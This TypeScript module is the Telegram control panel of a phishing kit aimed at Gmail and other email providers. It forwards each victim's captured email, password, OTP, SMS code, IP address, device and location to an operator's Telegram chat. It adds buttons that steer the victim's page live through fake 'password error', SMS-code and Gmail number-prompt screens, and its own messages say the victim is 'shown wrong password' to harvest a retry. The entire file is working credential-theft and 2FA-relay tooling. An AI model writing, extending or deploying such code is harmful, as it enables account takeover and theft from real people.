import {
  getDisplayTimezone,
  getTelegramBotToken,
  getTelegramChatId,
  isTelegramChannelEnabled,
  type TelegramChannel,
} from "./env";
import {
  formatSessionLocation,
  resolveAndCacheSessionLocation,
} from "./geolocation";
import {
  ensureCallbackKey,
  getSession,
  getSessionByCallbackKey,
  setSessionDecision,
  type SessionRecord,
} from "./store";
import { isGmailProvider } from "@/lib/providers";

type InlineButton = {
  text: string;
  callback_data?: string;
  copy_text?: { text: string };
};
type InlineKeyboard = { inline_keyboard: InlineButton[][] };

type TelegramApiResult = { ok: boolean; description?: string };

function getChannelForProvider(provider?: string | null): TelegramChannel {
  return isGmailProvider(provider) ? "gmail" : "other";
}

async function telegramApi<T extends TelegramApiResult>(
  channel: TelegramChannel,
  method: string,
  body: Record<string, unknown>,
) {
  const token = getTelegramBotToken(channel);
  const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  const data = (await response.json()) as T;
  if (!data.ok) {
    throw new Error(data.description ?? `Telegram ${method} failed`);
  }
  return data;
}

function numberPromptButtonText(session: SessionRecord): string {
  return session.promptNumber
    ? `📞 Number Prompt (${session.promptNumber})`
    : "📞 Number Prompt";
}

function buildGmailKeyboard(session: SessionRecord, key: string): InlineKeyboard {
  return {
    inline_keyboard: [
      [
        { text: "✅ Yes - Prompt", callback_data: `a:${key}:yes` },
        { text: "❌ Password error", callback_data: `a:${key}:perr` },
      ],
      [
        { text: "📱 SMS Code", callback_data: `a:${key}:sms` },
        { text: numberPromptButtonText(session), callback_data: `a:${key}:nmenu` },
      ],
      [{ text: "✅ Success", callback_data: `a:${key}:ok` }],
    ],
  };
}

/** Non-Gmail: no Gmail-only 2FA screens. */
function buildModalKeyboard(key: string): InlineKeyboard {
  return {
    inline_keyboard: [
      [
        { text: "❌ Password error", callback_data: `a:${key}:perr` },
        { text: "📱 OTP / SMS", callback_data: `a:${key}:sms` },
      ],
      [{ text: "✅ Success", callback_data: `a:${key}:ok` }],
    ],
  };
}

function buildOtpKeyboard(key: string): InlineKeyboard {
  return {
    inline_keyboard: [
      [
        { text: "❌ Wrong OTP", callback_data: `a:${key}:otperr` },
        { text: "✅ Success", callback_data: `a:${key}:ok` },
      ],
    ],
  };
}

function buildOperatorKeyboard(
  session: SessionRecord,
  key: string,
): InlineKeyboard {
  return isGmailProvider(session.provider)
    ? buildGmailKeyboard(session, key)
    : buildModalKeyboard(key);
}

/** Numbers 1–99 in rows of 8 (Telegram max per row), plus Back. */
function buildNumberKeyboard(key: string): InlineKeyboard {
  const rows: InlineButton[][] = [];
  const cols = 8;

  for (let start = 1; start <= 99; start += cols) {
    const row: InlineButton[] = [];
    for (let n = start; n < start + cols && n <= 99; n++) {
      row.push({ text: String(n), callback_data: `n:${key}:${n}` });
    }
    rows.push(row);
  }

  rows.push([{ text: "⬅️ Back", callback_data: `a:${key}:back` }]);
  return { inline_keyboard: rows };
}

function formatTime() {
  return new Date().toLocaleTimeString("en-NG", {
    hour: "numeric",
    minute: "2-digit",
    hour12: true,
    timeZone: getDisplayTimezone(),
  });
}

function escapeHtml(text: string) {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

/** Inline monospace in message body. */
function copyable(text: string) {
  return `<code>${escapeHtml(text)}</code>`;
}

function copyButton(label: string, value: string): InlineButton {
  return {
    text: label,
    copy_text: { text: value.slice(0, 256) },
  };
}

/** One-tap copy buttons — always shown when values exist. */
function buildCopyButtonRows(
  session: SessionRecord,
  extras?: { password?: string; otp?: string; code?: string },
): InlineButton[][] {
  const buttons: InlineButton[] = [];

  if (session.email) {
    buttons.push(copyButton("📋 Copy Email", session.email));
  }
  if (extras?.password) {
    buttons.push(copyButton("📋 Copy Password", extras.password));
  }
  if (extras?.otp) {
    buttons.push(copyButton("📋 Copy OTP", extras.otp));
  }
  if (extras?.code) {
    buttons.push(copyButton("📋 Copy SMS", extras.code));
  }

  if (buttons.length === 0) return [];

  const rows: InlineButton[][] = [];
  for (let i = 0; i < buttons.length; i += 2) {
    rows.push(buttons.slice(i, i + 2));
  }
  return rows;
}

function buildSubmissionKeyboard(
  session: SessionRecord,
  key: string,
  extras?: {
    password?: string;
    otp?: string;
    code?: string;
    attempt?: number;
  },
): InlineKeyboard {
  const copyRows = buildCopyButtonRows(session, extras);
  const isNonGmailFirstAttempt =
    extras?.attempt === 1 && !isGmailProvider(session.provider);
  const isOtpSubmission = Boolean(extras?.otp || extras?.code);

  const actionRows = isNonGmailFirstAttempt
    ? []
    : isOtpSubmission
      ? buildOtpKeyboard(key).inline_keyboard
      : buildOperatorKeyboard(session, key).inline_keyboard;

  return { inline_keyboard: [...copyRows, ...actionRows] };
}

function buildSubmissionText(
  session: SessionRecord,
  extras?: {
    password?: string;
    otp?: string;
    code?: string;
    attempt?: number;
    previousPassword?: string;
  },
) {
  const lines = [
    "🔔 <b>New Submission</b>",
    "",
    `📧 <b>Provider:</b> ${escapeHtml(session.provider ?? "UNKNOWN")}`,
    `📩 <b>Email:</b> ${session.email ? copyable(session.email) : "—"}`,
  ];

  if (extras?.attempt === 1 && !isGmailProvider(session.provider)) {
    lines.push(
      "",
      "⚠️ <b>Attempt 1</b> — victim shown wrong password (awaiting retry)",
    );
  } else if (extras?.attempt && extras.attempt >= 2) {
    lines.push(
      "",
      `✅ <b>Attempt ${extras.attempt}</b> — retry accepted, use buttons below`,
    );
  }

  if (extras?.password) {
    lines.push(`🔑 <b>Password:</b> ${copyable(extras.password)}`);
  }

  if (
    extras?.attempt &&
    extras.attempt >= 2 &&
    extras.previousPassword &&
    extras.password
  ) {
    if (extras.previousPassword === extras.password) {
      lines.push("↩️ <i>Same password as attempt 1</i>");
    } else {
      lines.push(
        `🔄 <i>Password changed</i> (attempt 1: ${copyable(extras.previousPassword)})`,
      );
    }
  }
  if (extras?.otp) {
    lines.push(`🔢 <b>OTP:</b> ${copyable(extras.otp)}`);
  }
  if (extras?.code) {
    lines.push(`📱 <b>SMS Code:</b> ${copyable(extras.code)}`);
  }

  lines.push(
    "",
    formatSessionLocation(session),
    `💻 <b>Device:</b> ${escapeHtml(session.userAgent ?? "—")}`,
    `🌐 <b>IP Address:</b> ${session.ip ? copyable(session.ip) : "—"}`,
    `🕐 <b>Time:</b> ${formatTime()}`,
  );

  return lines.join("\n");
}

export async function notifyTelegramIncoming(
  sessionId: string,
  provider: string,
) {
  const channel = getChannelForProvider(provider);
  if (!isTelegramChannelEnabled(channel)) return;

  const text = `👀 <b>Incoming submission from ${escapeHtml(provider)}</b>`;

  await telegramApi(channel, "sendMessage", {
    chat_id: getTelegramChatId(channel),
    text,
    parse_mode: "HTML",
  });
}

export async function notifyTelegramSubmission(
  sessionId: string,
  extras?: {
    password?: string;
    otp?: string;
    code?: string;
    attempt?: number;
    previousPassword?: string;
  },
) {
  const session = await resolveAndCacheSessionLocation(sessionId);
  if (!session) return;

  const channel = getChannelForProvider(session.provider);
  if (!isTelegramChannelEnabled(channel)) return;

  const key = await ensureCallbackKey(sessionId);
  const text = buildSubmissionText(session, extras);
  const keyboard = buildSubmissionKeyboard(session, key, extras);

  await telegramApi(channel, "sendMessage", {
    chat_id: getTelegramChatId(channel),
    text,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
}

const ACTION_MAP: Record<string, string> = {
  yes: "yes-prompt",
  perr: "password-error",
  sms: "sms-code",
  otperr: "otp-error",
  ok: "success",
};

export type TelegramUpdate = {
  update_id?: number;
  callback_query?: {
    id: string;
    data?: string;
    message?: { message_id: number; chat: { id: number } };
  };
};

export async function handleTelegramUpdate(
  update: TelegramUpdate,
  channel?: TelegramChannel,
) {
  const query = update.callback_query;
  if (!query?.data) return;

  const [kind, key, value] = query.data.split(":");

  let resolvedChannel = channel;
  if (!resolvedChannel && key) {
    const sessionForChannel = await getSessionByCallbackKey(key);
    if (sessionForChannel) {
      resolvedChannel = getChannelForProvider(sessionForChannel.provider);
    }
  }
  if (!resolvedChannel) resolvedChannel = "other";

  if (!isTelegramChannelEnabled(resolvedChannel)) return;

  if (!key) {
    await telegramApi(resolvedChannel, "answerCallbackQuery", {
      callback_query_id: query.id,
      text: "Invalid action",
    });
    return;
  }

  const session = await getSessionByCallbackKey(key);
  if (!session) {
    await telegramApi(resolvedChannel, "answerCallbackQuery", {
      callback_query_id: query.id,
      text: "Session expired",
    });
    return;
  }

  const chatId = query.message?.chat.id ?? getTelegramChatId(resolvedChannel);
  const messageId = query.message?.message_id;

  if (kind === "a" && value === "nmenu" && messageId) {
    if (!isGmailProvider(session.provider)) {
      await telegramApi(resolvedChannel, "answerCallbackQuery", {
        callback_query_id: query.id,
        text: "Number prompt is Gmail only",
      });
      return;
    }

    await telegramApi(resolvedChannel, "editMessageReplyMarkup", {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: buildNumberKeyboard(key),
    });
    await telegramApi(resolvedChannel, "answerCallbackQuery", {
      callback_query_id: query.id,
      text: "Select a number (1–99)",
    });
    return;
  }

  if (kind === "a" && value === "back" && messageId) {
    await telegramApi(resolvedChannel, "editMessageReplyMarkup", {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: buildOperatorKeyboard(session, key),
    });
    await telegramApi(resolvedChannel, "answerCallbackQuery", {
      callback_query_id: query.id,
    });
    return;
  }

  if (kind === "n" && value) {
    const num = value;
    await setSessionDecision(session.id, `number-prompt:${num}`);

    if (messageId) {
      const updatedSession = { ...session, promptNumber: num };
      await telegramApi(resolvedChannel, "editMessageReplyMarkup", {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: buildOperatorKeyboard(updatedSession, key),
      });
    }

    await telegramApi(resolvedChannel, "answerCallbackQuery", {
      callback_query_id: query.id,
      text: `Number prompt set to ${num}`,
    });
    return;
  }

  if (kind === "a" && value && ACTION_MAP[value]) {
    if (
      value === "yes" &&
      !isGmailProvider(session.provider)
    ) {
      await telegramApi(resolvedChannel, "answerCallbackQuery", {
        callback_query_id: query.id,
        text: "Yes-Prompt is Gmail only",
      });
      return;
    }

    await setSessionDecision(session.id, ACTION_MAP[value]);
    await telegramApi(resolvedChannel, "answerCallbackQuery", {
      callback_query_id: query.id,
      text: `Sent: ${ACTION_MAP[value]}`,
    });
    return;
  }

  await telegramApi(resolvedChannel, "answerCallbackQuery", {
    callback_query_id: query.id,
    text: "Unknown action",
  });
}

export async function processTelegramWebhook(
  request: Request,
  channel?: TelegramChannel,
): Promise<{ ok: boolean; status: number }> {
  if (channel) {
    if (!isTelegramChannelEnabled(channel)) {
      return { ok: false, status: 404 };
    }
  } else if (!isTelegramChannelEnabled("gmail") && !isTelegramChannelEnabled("other")) {
    return { ok: false, status: 404 };
  }

  const secret = process.env.TELEGRAM_WEBHOOK_SECRET;
  if (secret) {
    const header = request.headers.get("x-telegram-bot-api-secret-token");
    if (header !== secret) {
      return { ok: false, status: 401 };
    }
  }

  const update = (await request.json()) as TelegramUpdate;
  await handleTelegramUpdate(update, channel);
  return { ok: true, status: 200 };
}
